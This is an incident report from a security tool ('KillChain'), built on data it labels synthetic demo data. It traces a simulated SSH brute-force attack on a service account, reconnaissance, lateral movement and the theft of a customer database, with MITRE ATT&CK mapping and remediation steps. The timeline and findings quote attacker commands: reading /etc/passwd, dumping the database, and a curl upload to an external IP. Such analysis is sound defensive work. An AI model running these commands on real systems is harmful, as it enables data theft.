# KillChain Incident Report - INC-2026-0002

> **NOTE: This report is based on SYNTHETIC DEMONSTRATION DATA generated for the KillChain demo. It does not reflect a real intrusion.**

**Incident:** DB-01, WEB-01 - repeated failed logins (brute force)  
**Risk score:** 100/100 (critical)  
**Risk rationale:** Risk score 100/100 derived from 10 detection(s) (severity mix: critical, high, medium), 17 MITRE techniques, external infrastructure involvement and multi-host spread across 2 host(s).

## 1. Executive summary
Incident INC-2026-0002 correlates 37 security events into a reconstructed attack path. The analysis engine raised 10 detection(s), including 5 critical, spanning DB-01, WEB-01 and account(s) svc-backup. The reconstructed entry point is external IP 185.220.101.34 targeting account 'svc-backup' on WEB-01, first observed 2026-10-30 02:10:05. The attack progressed through the Cyber Kill Chain stages listed below. All findings in the Confirmed Findings section are backed by preserved raw log evidence; hypotheses are clearly separated.

## 2. Attack entry point
- First externally-sourced authentication activity: **First externally-sourced authentication activity against WEB-01 for account 'svc-backup' from 185.220.101.34.**
- First seen: 2026-10-30 02:10:05 (event E#64)

## 3. Attack progression (Cyber Kill Chain)
- **Reconnaissance** - Selecting targets and probing for reachable services / accounts.
  - Internal network scanning / reachability probing (medium)
- **Delivery** - The intrusion attempt reaches the target (e.g. credential attacks arriving).
  - Repeated failed logins (brute force) (critical)
- **Exploitation** - The attacker gains an initial foothold (e.g. valid-account login succeeds).
  - Successful login after repeated failures (critical)
  - Login outside business hours from a first-seen source (medium)
  - Login outside business hours from a first-seen source (medium)
- **Installation** - Post-access activity on the compromised host: discovery tooling, privilege escalation, lateral movement.
  - Suspicious process execution / discovery activity (high)
  - Lateral movement between internal hosts (critical)
  - Suspicious process execution / discovery activity (critical)
  - Failed privilege escalation (sudo) attempts (high)
- **Actions on Objectives** - The final goal: data collection, staging and exfiltration.
  - Data staged and uploaded to external infrastructure (critical)

## 4. Affected entities
- **users:** svc-backup
- **hosts:** DB-01, WEB-01
- **ips:** 10.20.6.15, 10.20.6.20, 10.20.6.30, 185.220.101.34
- **processes:** backup_agent, cat, curl, ipconfig.exe, mysqldump, net, net.exe, nltest.exe, ps, ssh.exe, sudo, tar, whoami.exe

## 5. MITRE ATT&CK mapping
| Technique | Name | Tactic | Triggered by | Evidence |
|---|---|---|---|---|
| T1110.001 | Brute Force: Password Guessing | Credential Access | Repeated failed logins (brute force) | E#64, E#65, E#66, E#68, E#69, E#71, E#72, E#73 |
| T1110 | Brute Force | Credential Access | Repeated failed logins (brute force); Successful login after repeated failures | E#64, E#65, E#66, E#68, E#69, E#71, E#72, E#73 |
| T1078 | Valid Accounts | Defense Evasion, Persistence, Privilege Escalation, Initial Access | Login outside business hours from a first-seen source; Successful login after repeated failures | E#1, E#64, E#65, E#66, E#68, E#69, E#71, E#72 |
| T1021.004 | Remote Services: SSH | Lateral Movement | Lateral movement between internal hosts | E#1, E#363 |
| T1021 | Remote Services | Lateral Movement | Lateral movement between internal hosts | E#1, E#363 |
| T1003.008 | OS Credential Dumping: /etc/passwd and /etc/shadow | Credential Access | Suspicious process execution / discovery activity | E#367, E#368, E#369, E#371, E#373 |
| T1005 | Data from Local System | Collection | Suspicious process execution / discovery activity | E#367, E#368, E#369, E#371, E#373 |
| T1041 | Exfiltration Over C2 Channel | Exfiltration | Data staged and uploaded to external infrastructure; Suspicious process execution / discovery activity | E#367, E#368, E#369, E#371, E#373 |
| T1057 | Process Discovery | Discovery | Suspicious process execution / discovery activity | E#367, E#368, E#369, E#371, E#373 |
| T1087 | Account Discovery | Discovery | Suspicious process execution / discovery activity | E#357, E#358, E#359, E#360, E#361, E#367, E#368, E#369 |
| T1567 | Exfiltration Over Web Service | Exfiltration | Data staged and uploaded to external infrastructure | E#373 |
| T1016 | System Network Configuration Discovery | Discovery | Suspicious process execution / discovery activity | E#357, E#358, E#359, E#360, E#361 |
| T1033 | System Owner/User Discovery | Discovery | Suspicious process execution / discovery activity | E#357, E#358, E#359, E#360, E#361 |
| T1548.003 | Abuse Elevation Control Mechanism: Sudo and Sudo Caching | Privilege Escalation, Defense Evasion | Failed privilege escalation (sudo) attempts | E#3, E#4, E#5 |
| T1078.003 | Valid Accounts: Local Accounts | Defense Evasion, Persistence, Privilege Escalation, Initial Access | Failed privilege escalation (sudo) attempts | E#3, E#4, E#5 |
| T1078.001 | Valid Accounts: Default Accounts | Defense Evasion, Persistence, Privilege Escalation, Initial Access | Login outside business hours from a first-seen source | E#1, E#82 |
| T1046 | Network Service Discovery | Discovery | Internal network scanning / reachability probing | E#364, E#365, E#366 |

## 6. Timeline
| Time | Description | User | Host | Source IP | MITRE | Severity | Evidence |
|---|---|---|---|---|---|---|---|
| 2026-10-30 01:30:00 | /opt/backup/run.sh --nightly | svc-backup | DB-01 | - | - | info | E#356 |
| 2026-10-30 02:10:05 | Failed password for svc-backup from 185.220.101.34 port 51000 ssh2 | svc-backup | WEB-01 | 185.220.101.34 | T1078, T1110, T1110.001 | critical | E#64 |
| 2026-10-30 02:10:41 | Failed password for svc-backup from 185.220.101.34 port 51007 ssh2 | svc-backup | WEB-01 | 185.220.101.34 | T1078, T1110, T1110.001 | critical | E#65 |
| 2026-10-30 02:11:18 | Failed password for svc-backup from 185.220.101.34 port 51014 ssh2 | svc-backup | WEB-01 | 185.220.101.34 | T1078, T1110, T1110.001 | critical | E#66 |
| 2026-10-30 02:12:02 | Failed password for svc-backup from 185.220.101.34 port 51021 ssh2 | svc-backup | WEB-01 | 185.220.101.34 | T1078, T1110, T1110.001 | critical | E#68 |
| 2026-10-30 02:12:55 | Failed password for svc-backup from 185.220.101.34 port 51028 ssh2 | svc-backup | WEB-01 | 185.220.101.34 | T1078, T1110, T1110.001 | critical | E#69 |
| 2026-10-30 02:14:20 | Failed password for svc-backup from 185.220.101.34 port 51035 ssh2 | svc-backup | WEB-01 | 185.220.101.34 | T1078, T1110, T1110.001 | critical | E#71 |
| 2026-10-30 02:15:03 | Failed password for svc-backup from 185.220.101.34 port 51042 ssh2 | svc-backup | WEB-01 | 185.220.101.34 | T1078, T1110, T1110.001 | critical | E#72 |
| 2026-10-30 02:16:44 | Failed password for svc-backup from 185.220.101.34 port 51049 ssh2 | svc-backup | WEB-01 | 185.220.101.34 | T1078, T1110, T1110.001 | critical | E#73 |
| 2026-10-30 02:18:09 | Failed password for svc-backup from 185.220.101.34 port 51056 ssh2 | svc-backup | WEB-01 | 185.220.101.34 | T1078, T1110, T1110.001 | critical | E#75 |
| 2026-10-30 02:19:51 | Failed password for svc-backup from 185.220.101.34 port 51063 ssh2 | svc-backup | WEB-01 | 185.220.101.34 | T1078, T1110, T1110.001 | critical | E#76 |
| 2026-10-30 02:21:30 | Failed password for svc-backup from 185.220.101.34 port 51070 ssh2 | svc-backup | WEB-01 | 185.220.101.34 | T1078, T1110, T1110.001 | critical | E#77 |
| 2026-10-30 02:23:12 | Failed password for svc-backup from 185.220.101.34 port 51077 ssh2 | svc-backup | WEB-01 | 185.220.101.34 | T1078, T1110, T1110.001 | critical | E#79 |
| 2026-10-30 02:25:02 | Failed password for svc-backup from 185.220.101.34 port 51084 ssh2 | svc-backup | WEB-01 | 185.220.101.34 | T1078, T1110, T1110.001 | critical | E#80 |
| 2026-10-30 02:26:38 | Failed password for svc-backup from 185.220.101.34 port 51091 ssh2 | svc-backup | WEB-01 | 185.220.101.34 | T1078, T1110, T1110.001 | critical | E#81 |
| 2026-10-30 02:27:14 | Accepted password for svc-backup from 185.220.101.34 port 51402 ssh2 | svc-backup | WEB-01 | 185.220.101.34 | T1078, T1078.001, T1110 | critical | E#82 |
| 2026-10-30 02:29:41 | whoami /all | svc-backup | WEB-01 | - | T1016, T1033, T1087 | high | E#357 |
| 2026-10-30 02:30:12 | ipconfig /all | svc-backup | WEB-01 | - | T1016, T1033, T1087 | high | E#358 |
| 2026-10-30 02:31:05 | net user /domain | svc-backup | WEB-01 | - | T1016, T1033, T1087 | high | E#359 |
| 2026-10-30 02:32:48 | nltest /dclist:corp | svc-backup | WEB-01 | - | T1016, T1033, T1087 | high | E#360 |
| 2026-10-30 02:33:19 | net group "Domain Admins" /domain | svc-backup | WEB-01 | - | T1016, T1033, T1087 | high | E#361 |
| 2026-10-30 02:36:02 | ssh -o StrictHostKeyChecking=no svc-backup@10.20.6.20 | svc-backup | WEB-01 | 10.20.6.15 | - | info | E#362 |
| 2026-10-30 02:36:03 | ssh svc-backup@10.20.6.20 | svc-backup | WEB-01 | 10.20.6.15 | T1021, T1021.004 | critical | E#363 |
| 2026-10-30 02:36:04 | Accepted password for svc-backup from 10.20.6.15 port 40022 ssh2 | svc-backup | DB-01 | 10.20.6.15 | T1021, T1021.004, T1078, T1078.001 | critical | E#1 |
| 2026-10-30 02:38:10 | powershell -c Test-NetConnection 10.20.6.30 -Port 445 | svc-backup | WEB-01 | 10.20.6.15 | T1046 | medium | E#364 |
| 2026-10-30 02:38:14 | powershell -c Test-NetConnection 10.20.6.30 -Port 3389 | svc-backup | WEB-01 | 10.20.6.15 | T1046 | medium | E#365 |
| 2026-10-30 02:38:18 | powershell -c Test-NetConnection 10.20.6.30 -Port 5985 | svc-backup | WEB-01 | 10.20.6.15 | T1046 | medium | E#366 |
| 2026-10-30 02:41:30 | ps aux --sort=-%mem | svc-backup | DB-01 | 10.20.6.15 | T1003.008, T1005, T1041, T1057, T1087 | critical | E#367 |
| 2026-10-30 02:43:11 | cat /etc/passwd | svc-backup | DB-01 | 10.20.6.15 | T1003.008, T1005, T1041, T1057, T1087 | critical | E#368 |
| 2026-10-30 02:44:55 | net group "Domain Admins" corp-db\svc-backup | svc-backup | DB-01 | 10.20.6.15 | T1003.008, T1005, T1041, T1057, T1087 | critical | E#369 |
| 2026-10-30 02:47:33 | svc-backup : 1 incorrect password attempts ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/b | svc-backup | DB-01 | - | T1078.003, T1548.003 | high | E#3 |
| 2026-10-30 02:47:33 | sudo su - | svc-backup | DB-01 | 10.20.6.15 | - | info | E#370 |
| 2026-10-30 02:47:51 | svc-backup : 2 incorrect password attempts ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/b | svc-backup | DB-01 | - | T1078.003, T1548.003 | high | E#4 |
| 2026-10-30 02:48:09 | svc-backup : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/b | svc-backup | DB-01 | - | T1078.003, T1548.003 | high | E#5 |
| 2026-10-30 02:49:02 | mysqldump -u backup_svc -p customers customers_db > /tmp/.bk_cache.sql | svc-backup | DB-01 | 10.20.6.15 | T1003.008, T1005, T1041, T1057, T1087 | critical | E#371 |
| 2026-10-30 02:52:26 | tar czf /tmp/.bk_cache.tgz /tmp/.bk_cache.sql | svc-backup | DB-01 | 10.20.6.15 | - | info | E#372 |
| 2026-10-30 02:53:40 | curl -T /tmp/.bk_cache.tgz http://185.220.101.34:8080/upload | svc-backup | DB-01 | 10.20.6.15 | T1003.008, T1005, T1041, T1057, T1087, T1567 | critical | E#373 |

## 7. Confirmed findings (observed evidence)
1. **Repeated failed logins (brute force)** (critical, confidence: high)
   - 14 failed authentication attempts for account 'svc-backup' from 185.220.101.34 against WEB-01 within 17 minutes (2026-10-30 02:10:05 - 2026-10-30 02:26:38). This rate of failure from a single source is consistent with automated password guessing.
   - Evidence events: E#64, E#65, E#66, E#68, E#69, E#71, E#72, E#73, E#75, E#76, E#77, E#79
2. **Successful login after repeated failures** (critical, confidence: high)
   - Account 'svc-backup' successfully authenticated from 185.220.101.34 to WEB-01 at 2026-10-30 02:27:14 after 14 failed attempts within the previous 60 minutes. This is the classic signature of a brute-force attack succeeding - the account should be treated as compromised.
   - Evidence events: E#64, E#65, E#66, E#68, E#69, E#71, E#72, E#73, E#75, E#76, E#77, E#79
3. **Lateral movement between internal hosts** (critical, confidence: high)
   - Account 'svc-backup' authenticated from internal host WEB-01 (10.20.6.15) to DB-01 at 2026-10-30 02:36:04 over SSH. This is flagged as lateral movement because account 'svc-backup' was targeted by external brute-force activity, source host WEB-01 recently ran suspicious discovery tooling, source host WEB-01 was itself accessed from an external IP. Combined with the observed remote connection this is evidence of attacker pivoting inside the environment.
   - Evidence events: E#363, E#1
4. **Suspicious process execution / discovery activity** (critical, confidence: high)
   - EDR telemetry recorded 5 suspicious process execution(s) on DB-01 run by svc-backup (2026-10-30 02:41:30 - 2026-10-30 02:53:40). Matched commands: 'cat /etc/passwd cat /etc/passwd'; 'curl -T /tmp/.bk_cache.tgz http://185.220.101.34:8080/upload curl -T /tmp/.bk_cache.tgz http://185.220.101.34:8080/upload'; 'mysqldump -u backup_svc -p customers customers_db > /tmp/.bk_cache.sql mysqldump -u backup_svc -p customers customers_db > /tmp/.bk_cache.sql'; 'net group "Domain Admins" corp-db\\svc-backup net group "Domain Admins" corp-db\\svc-backup'; 'ps aux --sort=-%mem ps aux --sort=-%mem'. These commands are characteristic of post-compromise reconnaissance and credential access tooling.
   - Evidence events: E#367, E#368, E#369, E#371, E#373
5. **Data staged and uploaded to external infrastructure** (critical, confidence: high)
   - Process 'curl' on DB-01 run by svc-backup transferred a file to external IP 185.220.101.34 at 2026-10-30 02:53:40 (command: curl -T /tmp/.bk_cache.tgz http://185.220.101.34:8080/upload). Outbound uploads to non-corporate infrastructure from a database host indicate data exfiltration.
   - Evidence events: E#373
6. **Suspicious process execution / discovery activity** (high, confidence: high)
   - EDR telemetry recorded 5 suspicious process execution(s) on WEB-01 run by svc-backup (2026-10-30 02:29:41 - 2026-10-30 02:33:19). Matched commands: 'ipconfig /all ipconfig /all'; 'net group "Domain Admins" /domain net group "Domain Admins" /domain'; 'net user /domain net user /domain'; 'nltest /dclist:corp nltest /dclist:corp'; 'whoami /all whoami /all'. These commands are characteristic of post-compromise reconnaissance and credential access tooling.
   - Evidence events: E#357, E#358, E#359, E#360, E#361
7. **Failed privilege escalation (sudo) attempts** (high, confidence: high)
   - Account 'svc-backup' made 3 failed attempts to elevate privileges via sudo on DB-01 (2026-10-30 02:47:33 - 2026-10-30 02:48:09), targeting 'root'. Repeated sudo failures by a service account indicate an attempt to reach root - a step that has no legitimate operational reason at this stage.
   - Evidence events: E#3, E#4, E#5
8. **Login outside business hours from a first-seen source** (medium, confidence: medium)
   - Account 'svc-backup' authenticated to WEB-01 from 185.220.101.34 at 2026-10-30 02:27:14 - during night hours (22:00-06:00) - and this source IP had never been observed for this account before in the analyzed data.
   - Evidence events: E#82
9. **Login outside business hours from a first-seen source** (medium, confidence: medium)
   - Account 'svc-backup' authenticated to DB-01 from 10.20.6.15 at 2026-10-30 02:36:04 - during night hours (22:00-06:00) - and this source IP had never been observed for this account before in the analyzed data.
   - Evidence events: E#1
10. **Internal network scanning / reachability probing** (medium, confidence: medium)
   - 3 network probe connection(s) from WEB-01 (user svc-backup) toward 10.20.6.30 (2026-10-30 02:38:10 - 2026-10-30 02:38:18). Scanning of neighboring internal systems is typical attacker behavior to find the next pivot target.
   - Evidence events: E#364, E#365, E#366

## 8. Hypotheses (INFERRED - not directly observed)
- **Potential next target (INFERRED):** WEB-01 probed 10.20.6.30 on multiple ports but no successful authentication to it is present in the analyzed data. The attacker may attempt lateral movement to 10.20.6.30 next - verify whether the compromised credentials are valid there.
- **Credential reuse (INFERRED):** Account 'svc-backup' was used successfully on DB-01, WEB-01. Credentials of this account may be reused on other systems that trust it - enumerate systems where the account exists.

## 9. Recommended investigation steps
1. Disable / rotate the credentials of the compromised account(s) and review all authentication activity from the attacker IP across the whole estate.
2. Block the attacker IP at the perimeter and check perimeter logs for other sources from the same ASN during the attack window.
3. Isolate the affected hosts and collect full EDR process trees; look for persistence mechanisms created in the same time window.
4. Audit authentication logs on all systems reachable from the compromised hosts for the same account usage during and after the incident window.
5. Review sudoers / local admin group membership for the involved accounts and confirm whether any elevation eventually succeeded.
6. Determine what data was collected/uploaded (file names, sizes, contents) and engage data owners on notification obligations.
7. Hunt across historical logs for earlier activity by the same accounts and IPs.
